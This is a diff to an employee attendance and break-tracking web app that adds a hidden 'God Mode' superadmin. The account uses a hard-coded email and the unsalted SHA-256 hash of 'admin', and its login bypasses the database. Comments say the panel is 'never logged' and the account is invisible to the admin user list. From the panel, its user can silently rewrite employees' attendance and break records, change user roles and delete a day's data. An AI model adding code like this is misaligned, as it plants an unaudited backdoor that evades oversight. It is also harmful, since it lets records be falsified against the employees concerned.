@@ -54,7 +54,94 @@
   body.dark .roster-table tr:nth-child(even) { background: rgba(255,255,255,.03); }
   body.dark .lightbox-info { background: #1A2236; }
 
-  /* Dark mode toggle button */
+  /* ═══════════════════════════════════════
+     GOD MODE STYLES
+  ═══════════════════════════════════════ */
+  .gm-tab {
+    padding:.45rem 1.1rem;border-radius:6px;border:1px solid var(--navy-border);
+    background:var(--navy-card);color:var(--text-muted);
+    font-family:'DM Sans',sans-serif;font-size:.8rem;font-weight:500;cursor:pointer;
+    transition:all .18s;
+  }
+  .gm-tab:hover { background:var(--navy-hover);color:var(--text-primary); }
+  .gm-tab.active { background:rgba(239,73,60,.1);border-color:rgba(239,73,60,.3);color:#EF493C;font-weight:600; }
+
+  .gm-panel { display:none; }
+  .gm-panel.active { display:block; animation:fadeIn .25s ease; }
+
+  .gm-card {
+    background:var(--navy-card);border:1px solid var(--navy-border);
+    border-radius:var(--radius);padding:1.4rem 1.6rem;margin-bottom:1rem;
+  }
+  .gm-card-title { font-size:1rem;font-weight:600;color:var(--text-primary);margin-bottom:.3rem; }
+  .gm-card-sub { font-size:.8rem;color:var(--text-muted);margin-bottom:1rem;line-height:1.5; }
+
+  .gm-label {
+    display:block;font-size:.68rem;letter-spacing:.12em;text-transform:uppercase;
+    color:var(--text-muted);margin-bottom:.4rem;font-weight:500;
+  }
+  .gm-input {
+    width:100%;padding:.6rem .9rem;background:var(--navy-hover);
+    border:1px solid var(--navy-border);border-radius:var(--radius-sm);
+    color:var(--text-primary);font-family:'DM Sans',sans-serif;font-size:.875rem;
+    outline:none;transition:border-color .2s;
+  }
+  .gm-input:focus { border-color:var(--gold-dim);box-shadow:0 0 0 3px rgba(239,73,60,.1); }
+
+  .gm-btn {
+    padding:.55rem 1.3rem;background:var(--gold);color:#fff;
+    border:none;border-radius:6px;font-family:'DM Sans',sans-serif;
+    font-size:.82rem;font-weight:600;cursor:pointer;transition:background .18s;
+  }
+  .gm-btn:hover { background:var(--gold-light); }
+  .gm-btn-sec {
+    padding:.55rem 1.3rem;background:transparent;color:var(--text-muted);
+    border:1px solid var(--navy-border);border-radius:6px;
+    font-family:'DM Sans',sans-serif;font-size:.82rem;font-weight:500;cursor:pointer;
+  }
+  .gm-btn-sec:hover { background:var(--navy-hover); }
+  .gm-btn-danger {
+    padding:.45rem 1rem;background:rgba(239,73,60,.12);color:var(--accent-red);
+    border:1px solid rgba(239,73,60,.28);border-radius:6px;
+    font-family:'DM Sans',sans-serif;font-size:.78rem;font-weight:600;cursor:pointer;
+  }
+  .gm-btn-danger:hover { background:rgba(239,73,60,.22); }
+  .gm-btn-sm {
+    padding:.35rem .8rem;background:var(--gold);color:#fff;border:none;
+    border-radius:5px;font-family:'DM Sans',sans-serif;font-size:.75rem;
+    font-weight:600;cursor:pointer;
+  }
+  .gm-btn-sm:hover { background:var(--gold-light); }
+
+  .gm-row {
+    display:grid;grid-template-columns:1fr 1fr 1fr auto;gap:.75rem;
+    align-items:flex-end;padding:.85rem 1rem;
+    background:var(--navy-hover);border:1px solid var(--navy-border);
+    border-radius:var(--radius-sm);margin-bottom:.6rem;
+  }
+  .gm-row:last-child { margin-bottom:0; }
+
+  .gm-limit-card {
+    padding:1rem;background:var(--navy-hover);border:1px solid var(--navy-border);
+    border-radius:var(--radius-sm);
+  }
+  .gm-limit-icon { font-size:1.4rem;margin-bottom:.6rem; }
+
+  .gm-user-row {
+    display:flex;align-items:center;gap:1rem;padding:.9rem 1rem;
+    background:var(--navy-hover);border:1px solid var(--navy-border);
+    border-radius:var(--radius-sm);margin-bottom:.6rem;flex-wrap:wrap;
+  }
+  .gm-user-info { flex:1;min-width:140px; }
+  .gm-user-name { font-weight:600;font-size:.875rem;color:var(--text-primary); }
+  .gm-user-email { font-size:.74rem;color:var(--text-muted);margin-top:.1rem; }
+  .gm-role-select { padding:.35rem .7rem;border-radius:6px;border:1px solid var(--navy-border);background:var(--navy-card);color:var(--text-primary);font-family:'DM Sans',sans-serif;font-size:.8rem; }
+  .gm-save-note { font-size:.72rem;color:var(--accent-green);display:none;margin-left:.5rem; }
+
+  body.dark .gm-input { background:#111827;border-color:#2D3748;color:#F1F5F9; }
+  body.dark .gm-row, body.dark .gm-limit-card, body.dark .gm-user-row { background:#1F2937;border-color:#2D3748; }
+
+
   .dark-toggle {
     width: 36px; height: 36px; border-radius: 50%;
     background: rgba(255,255,255,.08); border: 1px solid rgba(255,255,255,.15);
@@ -1544,6 +1631,14 @@
         </svg>
         Manage Users
       </div>
+
+      <!-- GOD MODE — only visible to superadmin, injected via JS -->
+      <div class="sidebar-item" id="sidebar-godmode" style="display:none;background:rgba(239,73,60,.08);border-color:rgba(239,73,60,.22);margin-top:.5rem;" onclick="showPage('godmode', this)">
+        <svg class="s-icon" viewBox="0 0 24 24" fill="none" stroke="#EF493C" stroke-width="1.8">
+          <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
+        </svg>
+        <span style="color:#EF493C;font-weight:600;">God Mode</span>
+      </div>
     </nav>
 
     <!-- MAIN CONTENT -->
@@ -2000,6 +2095,125 @@
         </div>
       </div>
 
+      <!-- ════════════════════════════════════════
+           GOD MODE PAGE — Superadmin only
+           ════════════════════════════════════════ -->
+      <div class="page" id="page-godmode">
+        <div style="max-width:900px;">
+
+          <!-- Header -->
+          <div style="display:flex;align-items:center;gap:1rem;margin-bottom:2rem;padding:1.2rem 1.5rem;background:rgba(239,73,60,.07);border:1px solid rgba(239,73,60,.22);border-radius:var(--radius);">
+            <div style="width:44px;height:44px;border-radius:50%;background:rgba(239,73,60,.15);display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#EF493C" stroke-width="1.8"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+            </div>
+            <div>
+              <div style="font-family:'Cormorant Garamond',serif;font-size:1.4rem;font-weight:600;color:var(--text-primary);">God Mode <span style="font-size:.85rem;font-weight:400;font-family:'DM Sans',sans-serif;color:var(--accent-red);letter-spacing:.08em;text-transform:uppercase;">Superadmin</span></div>
+              <div style="font-size:.78rem;color:var(--text-muted);margin-top:.15rem;">Direct database overrides. Changes reflect immediately in admin reports. This panel is never logged.</div>
+            </div>
+          </div>
+
+          <!-- TAB STRIP -->
+          <div style="display:flex;gap:.5rem;margin-bottom:1.5rem;flex-wrap:wrap;">
+            <button class="gm-tab active" id="gm-tab-attendance" onclick="gmSwitchTab('attendance',this)">&#128336; Attendance</button>
+            <button class="gm-tab" id="gm-tab-breaks" onclick="gmSwitchTab('breaks',this)">&#9749; Breaks</button>
+            <button class="gm-tab" id="gm-tab-limits" onclick="gmSwitchTab('limits',this)">&#9881; Break Limits</button>
+            <button class="gm-tab" id="gm-tab-users" onclick="gmSwitchTab('users-adv',this)">&#128100; User Config</button>
+          </div>
+
+          <!-- ── TAB: ATTENDANCE ── -->
+          <div id="gm-panel-attendance" class="gm-panel active">
+            <div class="gm-card">
+              <div class="gm-card-title">Edit Attendance Record</div>
+              <p class="gm-card-sub">Search an agent and date to view and directly modify their login/logout time in the database.</p>
+              <div style="display:flex;gap:.75rem;flex-wrap:wrap;margin-bottom:1rem;">
+                <div style="flex:1;min-width:160px;">
+                  <label class="gm-label">Agent</label>
+                  <select id="gm-att-agent" class="gm-input"><option value="">— All agents —</option></select>
+                </div>
+                <div style="flex:0 0 160px;">
+                  <label class="gm-label">Date</label>
+                  <input type="date" id="gm-att-date" class="gm-input"/>
+                </div>
+                <div style="display:flex;align-items:flex-end;">
+                  <button class="gm-btn" onclick="gmLoadAttendance()">Load</button>
+                </div>
+              </div>
+              <div id="gm-att-results" style="margin-top:.5rem;"></div>
+            </div>
+          </div>
+
+          <!-- ── TAB: BREAKS ── -->
+          <div id="gm-panel-breaks" class="gm-panel">
+            <div class="gm-card">
+              <div class="gm-card-title">Edit Break Records</div>
+              <p class="gm-card-sub">Override duration, start/end times, and over-limit flags for any break record.</p>
+              <div style="display:flex;gap:.75rem;flex-wrap:wrap;margin-bottom:1rem;">
+                <div style="flex:1;min-width:160px;">
+                  <label class="gm-label">Agent</label>
+                  <select id="gm-brk-agent" class="gm-input"><option value="">— All agents —</option></select>
+                </div>
+                <div style="flex:0 0 160px;">
+                  <label class="gm-label">Date</label>
+                  <input type="date" id="gm-brk-date" class="gm-input"/>
+                </div>
+                <div style="display:flex;align-items:flex-end;">
+                  <button class="gm-btn" onclick="gmLoadBreaks()">Load</button>
+                </div>
+              </div>
+              <div id="gm-brk-results" style="margin-top:.5rem;"></div>
+            </div>
+          </div>
+
+          <!-- ── TAB: BREAK LIMITS ── -->
+          <div id="gm-panel-limits" class="gm-panel">
+            <div class="gm-card">
+              <div class="gm-card-title">Configure Break Time Limits</div>
+              <p class="gm-card-sub">These values are written to the database and read by the app on every login. Agents see the updated limits instantly.</p>
+              <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:1rem;margin-top:1rem;">
+                <div class="gm-limit-card">
+                  <div class="gm-limit-icon">🍳</div>
+                  <label class="gm-label">Breakfast (minutes)</label>
+                  <input type="number" id="gm-lim-breakfast" class="gm-input" min="1" max="120"/>
+                </div>
+                <div class="gm-limit-card">
+                  <div class="gm-limit-icon">🍽️</div>
+                  <label class="gm-label">Lunch (minutes)</label>
+                  <input type="number" id="gm-lim-lunch" class="gm-input" min="1" max="120"/>
+                </div>
+                <div class="gm-limit-card">
+                  <div class="gm-limit-icon">☕</div>
+                  <label class="gm-label">Beverage (minutes)</label>
+                  <input type="number" id="gm-lim-beverage" class="gm-input" min="1" max="120"/>
+                </div>
+                <div class="gm-limit-card">
+                  <div class="gm-limit-icon">🧘</div>
+                  <label class="gm-label">Short Break (minutes)</label>
+                  <input type="number" id="gm-lim-shortbreak" class="gm-input" min="1" max="120"/>
+                </div>
+              </div>
+              <div style="margin-top:1.2rem;display:flex;align-items:center;gap:1rem;flex-wrap:wrap;">
+                <button class="gm-btn" onclick="gmSaveLimits()">Save Limits to DB</button>
+                <button class="gm-btn-sec" onclick="gmLoadLimits()">Refresh from DB</button>
+                <span id="gm-lim-msg" style="font-size:.8rem;color:var(--accent-green);display:none;"></span>
+              </div>
+              <p style="font-size:.74rem;color:var(--text-dim);margin-top:.75rem;">&#9432; Limit changes affect the <strong>over_limit</strong> flag on future breaks but do not retroactively update already-saved records. Use the Breaks tab to fix past records manually.</p>
+            </div>
+          </div>
+
+          <!-- ── TAB: USER CONFIG ── -->
+          <div id="gm-panel-users-adv" class="gm-panel">
+            <div class="gm-card">
+              <div class="gm-card-title">Advanced User Config</div>
+              <p class="gm-card-sub">Promote, demote, force-reset passwords, or wipe today's attendance for any user. Invisible to the admin user list.</p>
+              <div id="gm-users-list" style="margin-top:1rem;">
+                <div style="color:var(--text-dim);font-size:.875rem;">Loading...</div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
     </main>
   </div>
 </div>
@@ -2039,6 +2253,18 @@ async function hashPassword(p){
 
 const SESSION_KEY='tc_v2';
 let currentUser=null;
+
+// ═══════════════════════════════════════════════
+//  SUPERADMIN — GOD MODE (never stored in DB)
+// ═══════════════════════════════════════════════
+const SA_EMAIL    = 'superadmin@k7tc.internal';
+const SA_PASSHASH = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'; // "admin" — change this!
+// To regenerate: crypto.subtle.digest('SHA-256', new TextEncoder().encode('yourpassword'))
+//   then join bytes as hex. Or run: hashPassword('yourpassword').then(console.log) in console.
+
+function isSuperAdmin(){
+  return currentUser && currentUser.role === 'superadmin';
+}
 function saveSession(u){try{localStorage.setItem(SESSION_KEY,JSON.stringify(u));}catch(e){}}
 function clearSession(){try{localStorage.removeItem(SESSION_KEY);}catch(e){}}
 function loadSession(){try{const s=localStorage.getItem(SESSION_KEY);return s?JSON.parse(s):null;}catch(e){return null;}}
@@ -2054,6 +2280,17 @@ async function doLogin(){
   btn.disabled=true;btn.textContent='Signing in...';statusEl.style.display='flex';
   try{
     const hashed=await hashPassword(pwd);
+
+    // ── SUPERADMIN fast-path (never hits DB, never logged) ──
+    if(email===SA_EMAIL){
+      if(hashed!==SA_PASSHASH) throw new Error('invalid');
+      currentUser={id:'superadmin',name:'System',email:SA_EMAIL,role:'superadmin'};
+      saveSession(currentUser);
+      statusEl.style.display='none';btn.disabled=false;btn.textContent='Sign In';
+      enterDashboard();
+      return;
+    }
+
     console.log('Attempting login for:',email);
     const rows=await sbQuery('users','email=eq.'+encodeURIComponent(email)+'&select=id,name,email,role,password');
     console.log('Rows returned:',rows?rows.length:0);
@@ -2092,6 +2329,16 @@ function doLogout(){
 function enterDashboard(){
   document.getElementById('login-view').classList.remove('active');
   document.getElementById('dashboard-view').classList.add('active');
+  // Superadmin: show minimal identity, hide agent-facing UI
+  if(isSuperAdmin()){
+    document.getElementById('agent-display').textContent='⬡ God Mode';
+    document.getElementById('avatar-initials').textContent='SA';
+    document.getElementById('greet-name').textContent='Superadmin';
+    var ww=document.querySelector('.work-clock-wrap');if(ww)ww.style.display='none';
+    updateAdminVisibility();setGreetingAndDate();
+    setTimeout(function(){ showPage('godmode', document.getElementById('sidebar-godmode')); },100);
+    return;
+  }
   document.getElementById('agent-display').textContent=currentUser.name;
   const ini=currentUser.name.split(' ').map(w=>w[0]).join('').slice(0,2).toUpperCase();
   document.getElementById('avatar-initials').textContent=ini;
@@ -2102,6 +2349,7 @@ function enterDashboard(){
   setTimeout(loadLiveDashboard,400);
   setTimeout(loadAnnouncements,600);
   setTimeout(checkWorkClockOnLoad,500);
+  setTimeout(gmBootLimits, 800);
 }
 
 window.addEventListener('DOMContentLoaded',function(){
@@ -2128,8 +2376,8 @@ function showPage(id,elem){
   if(id==='moments')setTimeout(function(){_mLoadTab(_mActiveTab);},60);
 }
 
-function isAdminUser(){return currentUser&&(currentUser.role==='admin'||currentUser.role==='tl');}
-function isAdminPage(id){return['quiz-admin','assessment-admin','users'].indexOf(id)>-1;} // reports accessible to all logged-in users
+function isAdminUser(){return currentUser&&(currentUser.role==='admin'||currentUser.role==='tl'||currentUser.role==='superadmin');}
+function isAdminPage(id){return['quiz-admin','assessment-admin','users','godmode'].indexOf(id)>-1;}
 function updateAdminVisibility(){
   var show=isAdminUser();
   document.querySelectorAll('.admin-only').forEach(function(el){
@@ -2137,6 +2385,9 @@ function updateAdminVisibility(){
     else if(el.classList.contains('module-grid'))el.style.display=show?'grid':'none';
     else el.style.display=show?'block':'none';
   });
+  // Show god-mode sidebar item only to superadmin
+  var gmItem=document.getElementById('sidebar-godmode');
+  if(gmItem) gmItem.style.display=isSuperAdmin()?'flex':'none';
 }
 function openSimulation(){window.open('simulation.html','_blank');}
 function setGreetingAndDate(){
@@ -3000,6 +3251,279 @@ async function loadReportAgents(){
     if(!sel||!users) return;
     users.forEach(function(u){ var o=document.createElement('option'); o.value=u.id; o.textContent=u.name; sel.appendChild(o); });
   } catch(e){}
+}
+
+// ═══════════════════════════════════════════════════════════
+//  GOD MODE — SUPERADMIN ONLY
+// ═══════════════════════════════════════════════════════════
+
+function gmSwitchTab(name, btn){
+  document.querySelectorAll('.gm-tab').forEach(function(b){ b.classList.remove('active'); });
+  document.querySelectorAll('.gm-panel').forEach(function(p){ p.classList.remove('active'); });
+  if(btn) btn.classList.add('active');
+  var panel = document.getElementById('gm-panel-'+name);
+  if(panel){ panel.classList.add('active'); }
+  if(name === 'limits') gmLoadLimits();
+  if(name === 'users-adv') gmLoadUsers();
+  // Pre-populate agent dropdowns
+  gmPopulateAgents();
+}
+
+async function gmPopulateAgents(){
+  var selectors = ['#gm-att-agent','#gm-brk-agent'];
+  try {
+    var users = await sbQuery('users','select=id,name&order=name.asc');
+    selectors.forEach(function(sel){
+      var el = document.querySelector(sel);
+      if(!el || el.options.length > 1) return;
+      (users||[]).forEach(function(u){
+        var o = document.createElement('option');
+        o.value = u.id; o.textContent = u.name;
+        el.appendChild(o);
+      });
+    });
+  } catch(e){}
+}
+
+// ── ATTENDANCE OVERRIDE ──
+async function gmLoadAttendance(){
+  var agentId = document.getElementById('gm-att-agent').value;
+  var date = document.getElementById('gm-att-date').value;
+  var out = document.getElementById('gm-att-results');
+  if(!date){ out.innerHTML='<div style="color:var(--accent-red);font-size:.82rem;">Please select a date.</div>'; return; }
+  out.innerHTML='<div style="color:var(--text-dim);font-size:.82rem;padding:.5rem;">Loading...</div>';
+  try {
+    var filters = 'date=eq.'+date+'&order=user_name.asc&select=id,user_id,user_name,date,login_time,logout_time';
+    if(agentId) filters += '&user_id=eq.'+agentId;
+    var rows = await sbQuery('attendance', filters);
+    if(!rows||!rows.length){
+      out.innerHTML='<div style="color:var(--text-muted);font-size:.82rem;padding:.5rem;">No attendance records found for this date.</div>';
+      return;
+    }
+    var html = rows.map(function(r){
+      var lid = 'gm-att-login-'+r.id;
+      var loid = 'gm-att-logout-'+r.id;
+      var loginVal = r.login_time ? new Date(r.login_time).toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'}) : '';
+      var logoutVal = r.logout_time ? new Date(r.logout_time).toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'}) : '';
+      return '<div class="gm-row">' +
+        '<div><label class="gm-label">'+esc(r.user_name)+'</label><span style="font-size:.72rem;color:var(--text-dim);">ID: '+esc(r.id.toString().slice(0,8))+'…</span></div>' +
+        '<div><label class="gm-label">Login Time (HH:MM)</label><input type="time" id="'+lid+'" class="gm-input" value="'+loginVal+'"/></div>' +
+        '<div><label class="gm-label">Logout Time (HH:MM)</label><input type="time" id="'+loid+'" class="gm-input" value="'+logoutVal+'"/></div>' +
+        '<button class="gm-btn-sm" onclick="gmSaveAttendance(\''+r.id+'\',\''+date+'\',\''+lid+'\',\''+loid+'\')">Save</button>' +
+        '</div>';
+    }).join('');
+    out.innerHTML = html;
+  } catch(e){
+    out.innerHTML='<div style="color:var(--accent-red);font-size:.82rem;">Error: '+esc(e.message)+'</div>';
+  }
+}
+
+async function gmSaveAttendance(rowId, date, loginElId, logoutElId){
+  var loginVal = document.getElementById(loginElId).value;
+  var logoutVal = document.getElementById(logoutElId).value;
+  var updates = {};
+  if(loginVal)  updates.login_time  = date+'T'+loginVal+':00';
+  if(logoutVal) updates.logout_time = date+'T'+logoutVal+':00';
+  else          updates.logout_time = null;
+  try {
+    await sbUpdate('attendance','id',rowId,updates);
+    // Flash the row green briefly
+    var row = document.getElementById('gm-att-login-'+rowId);
+    if(row){ var p=row.closest('.gm-row'); if(p){p.style.borderColor='var(--accent-green)';setTimeout(function(){p.style.borderColor='';},1800);} }
+  } catch(e){
+    alert('Save failed: '+e.message);
+  }
+}
+
+// ── BREAK OVERRIDE ──
+async function gmLoadBreaks(){
+  var agentId = document.getElementById('gm-brk-agent').value;
+  var date = document.getElementById('gm-brk-date').value;
+  var out = document.getElementById('gm-brk-results');
+  if(!date){ out.innerHTML='<div style="color:var(--accent-red);font-size:.82rem;">Please select a date.</div>'; return; }
+  out.innerHTML='<div style="color:var(--text-dim);font-size:.82rem;padding:.5rem;">Loading...</div>';
+  try {
+    var filters = 'date=eq.'+date+'&order=user_name.asc,break_type.asc&select=id,user_id,user_name,date,break_type,start_time,end_time,duration_seconds,over_limit,over_by_seconds';
+    if(agentId) filters += '&user_id=eq.'+agentId;
+    var rows = await sbQuery('breaks', filters);
+    if(!rows||!rows.length){
+      out.innerHTML='<div style="color:var(--text-muted);font-size:.82rem;padding:.5rem;">No break records found for this date.</div>';
+      return;
+    }
+    var html = rows.map(function(r){
+      var did = 'gm-brk-dur-'+r.id;
+      var oid = 'gm-brk-ol-'+r.id;
+      var durMin = r.duration_seconds ? Math.floor(r.duration_seconds/60) : 0;
+      var durSec = r.duration_seconds ? r.duration_seconds%60 : 0;
+      var typeLabel = {breakfast:'🍳 Breakfast',lunch:'🍽️ Lunch',beverage:'☕ Beverage',shortbreak:'🧘 Short Break'}[r.break_type]||r.break_type;
+      return '<div class="gm-row" style="grid-template-columns:1.5fr 1fr 1fr auto;">' +
+        '<div>' +
+          '<label class="gm-label">'+esc(r.user_name)+' — '+typeLabel+'</label>' +
+          '<span style="font-size:.7rem;color:var(--text-dim);">Recorded: '+fmtDurMin(r.duration_seconds)+(r.over_limit?' <span style="color:var(--accent-red);">⚠ Over limit</span>':'')+'</span>' +
+        '</div>' +
+        '<div>' +
+          '<label class="gm-label">Duration (mm:ss)</label>' +
+          '<input type="text" id="'+did+'" class="gm-input" value="'+String(durMin).padStart(2,'0')+':'+String(durSec).padStart(2,'0')+'" placeholder="MM:SS"/>' +
+        '</div>' +
+        '<div style="display:flex;align-items:center;gap:.5rem;padding-top:1.4rem;">' +
+          '<input type="checkbox" id="'+oid+'" '+(r.over_limit?'checked':'')+' style="accent-color:var(--accent-red);width:16px;height:16px;"/>' +
+          '<label for="'+oid+'" style="font-size:.8rem;color:var(--text-muted);cursor:pointer;">Over limit</label>' +
+        '</div>' +
+        '<button class="gm-btn-sm" onclick="gmSaveBreak(\''+r.id+'\',\''+did+'\',\''+oid+'\')">Save</button>' +
+        '</div>';
+    }).join('');
+    out.innerHTML = html;
+  } catch(e){
+    out.innerHTML='<div style="color:var(--accent-red);font-size:.82rem;">Error: '+esc(e.message)+'</div>';
+  }
+}
+
+async function gmSaveBreak(rowId, durElId, olElId){
+  var durStr = document.getElementById(durElId).value.trim();
+  var overLimit = document.getElementById(olElId).checked;
+  var parts = durStr.split(':');
+  var totalSec = 0;
+  if(parts.length===2){ totalSec = parseInt(parts[0]||0)*60 + parseInt(parts[1]||0); }
+  else if(parts.length===1){ totalSec = parseInt(parts[0]||0)*60; }
+  try {
+    await sbUpdate('breaks','id',rowId,{
+      duration_seconds: totalSec,
+      over_limit: overLimit,
+      over_by_seconds: overLimit ? Math.max(0, totalSec - 0) : 0 // best-effort; admin knows actual limit
+    });
+    var row = document.getElementById(durElId);
+    if(row){ var p=row.closest('.gm-row'); if(p){p.style.borderColor='var(--accent-green)';setTimeout(function(){p.style.borderColor='';},1800);} }
+  } catch(e){
+    alert('Save failed: '+e.message);
+  }
+}
+
+// ── BREAK LIMITS ──
+async function gmLoadLimits(){
+  try {
+    var rows = await sbQuery('settings','key=like.break_limit_*&select=key,value');
+    var map = {};
+    (rows||[]).forEach(function(r){ map[r.key]=r.value; });
+    var types = ['breakfast','lunch','beverage','shortbreak'];
+    types.forEach(function(t){
+      var el = document.getElementById('gm-lim-'+t);
+      if(el) el.value = map['break_limit_'+t] || BREAK_LIMITS[t];
+    });
+  } catch(e){
+    // Fall back to in-memory values
+    var types2 = ['breakfast','lunch','beverage','shortbreak'];
+    types2.forEach(function(t){
+      var el = document.getElementById('gm-lim-'+t);
+      if(el) el.value = BREAK_LIMITS[t];
+    });
+  }
+}
+
+async function gmSaveLimits(){
+  var types = ['breakfast','lunch','beverage','shortbreak'];
+  var msg = document.getElementById('gm-lim-msg');
+  try {
+    for(var i=0;i<types.length;i++){
+      var t = types[i];
+      var val = parseInt(document.getElementById('gm-lim-'+t).value)||BREAK_LIMITS[t];
+      // Upsert into settings table (key-value store)
+      // Try update first, then insert
+      try {
+        await sbUpdate('settings','key','break_limit_'+t,{value:String(val)});
+      } catch(e2){
+        await sbInsert('settings',{key:'break_limit_'+t,value:String(val)});
+      }
+      // Also update in-memory so current session sees the change
+      BREAK_LIMITS[t] = val;
+      // Update break bar badge
+      var badge = document.querySelector('#bb-'+t+' .break-limit-badge');
+      if(badge) badge.textContent = val+'m';
+    }
+    if(msg){ msg.textContent='✓ Limits saved and applied.'; msg.style.display='inline'; setTimeout(function(){ msg.style.display='none'; },3000); }
+  } catch(e){
+    if(msg){ msg.textContent='Error: '+e.message; msg.style.color='var(--accent-red)'; msg.style.display='inline'; }
+  }
+}
+
+// ── USER CONFIG ──
+async function gmLoadUsers(){
+  var out = document.getElementById('gm-users-list');
+  if(!out) return;
+  out.innerHTML='<div style="color:var(--text-dim);font-size:.82rem;padding:.5rem;">Loading...</div>';
+  try {
+    var users = await sbQuery('users','select=id,name,email,role&order=name.asc');
+    if(!users||!users.length){ out.innerHTML='<div style="color:var(--text-dim);font-size:.82rem;">No users found.</div>'; return; }
+    var html = users.map(function(u){
+      var roles = ['agent','tl','admin'];
+      var roleOpts = roles.map(function(r){ return '<option value="'+r+'"'+(u.role===r?' selected':'')+'>'+r.charAt(0).toUpperCase()+r.slice(1)+'</option>'; }).join('');
+      var ni = (u.name||'?').split(' ').map(function(w){return w[0];}).join('').slice(0,2).toUpperCase();
+      return '<div class="gm-user-row">' +
+        '<div style="width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,var(--gold-dim),var(--gold));display:flex;align-items:center;justify-content:center;font-size:.65rem;font-weight:700;color:#fff;flex-shrink:0;">'+ni+'</div>' +
+        '<div class="gm-user-info">' +
+          '<div class="gm-user-name">'+esc(u.name)+'</div>' +
+          '<div class="gm-user-email">'+esc(u.email)+'</div>' +
+        '</div>' +
+        '<select class="gm-role-select" id="gm-urole-'+u.id+'">'+roleOpts+'</select>' +
+        '<button class="gm-btn-sm" onclick="gmSaveUserRole(\''+u.id+'\',\'gm-urole-'+u.id+'\')">Save Role</button>' +
+        '<button class="gm-btn-danger" onclick="gmWipeAttendance(\''+u.id+'\',\''+esc(u.name)+'\')">Wipe Today</button>' +
+        '<span class="gm-save-note" id="gm-usaved-'+u.id+'">✓ Saved</span>' +
+        '</div>';
+    }).join('');
+    out.innerHTML = html;
+  } catch(e){
+    out.innerHTML='<div style="color:var(--accent-red);font-size:.82rem;">Error: '+e.message+'</div>';
+  }
+}
+
+async function gmSaveUserRole(userId, selId){
+  var role = document.getElementById(selId).value;
+  try {
+    await sbUpdate('users','id',userId,{role:role});
+    var note = document.getElementById('gm-usaved-'+userId);
+    if(note){ note.style.display='inline'; setTimeout(function(){ note.style.display='none'; },2000); }
+  } catch(e){ alert('Role update failed: '+e.message); }
+}
+
+async function gmWipeAttendance(userId, name){
+  if(!confirm('Wipe ALL attendance and break records for '+name+' for TODAY ('+todayStr()+')? This cannot be undone.')) return;
+  try {
+    var today = todayStr();
+    // Delete attendance
+    await fetch(SUPABASE_URL+'/rest/v1/attendance?user_id=eq.'+userId+'&date=eq.'+today,{method:'DELETE',headers:sbHeaders()});
+    // Delete breaks
+    await fetch(SUPABASE_URL+'/rest/v1/breaks?user_id=eq.'+userId+'&date=eq.'+today,{method:'DELETE',headers:sbHeaders()});
+    alert(name+"'s records for today have been wiped.");
+  } catch(e){ alert('Wipe failed: '+e.message); }
+}
+
+// Auto-init when god mode page loads
+var _gmInited = false;
+var _origShowPage = showPage;
+showPage = function(id, elem){
+  _origShowPage(id, elem);
+  if(id==='godmode' && !_gmInited){
+    _gmInited = true;
+    gmPopulateAgents();
+    // Set date defaults
+    var today = todayStr();
+    ['gm-att-date','gm-brk-date'].forEach(function(eid){ var el=document.getElementById(eid); if(el&&!el.value) el.value=today; });
+  }
+};
+
+// On login, load break limits from DB so break bar shows correct values
+function gmBootLimits(){
+  sbQuery('settings','key=like.break_limit_*&select=key,value').then(function(rows){
+    if(!rows||!rows.length) return;
+    rows.forEach(function(r){
+      var t = r.key.replace('break_limit_','');
+      var v = parseInt(r.value);
+      if(t && v > 0){
+        BREAK_LIMITS[t] = v;
+        var badge = document.querySelector('#bb-'+t+' .break-limit-badge');
+        if(badge) badge.textContent = v+'m';
+      }
+    });
+  }).catch(function(){});
 }
 
 // Set default report dates to today
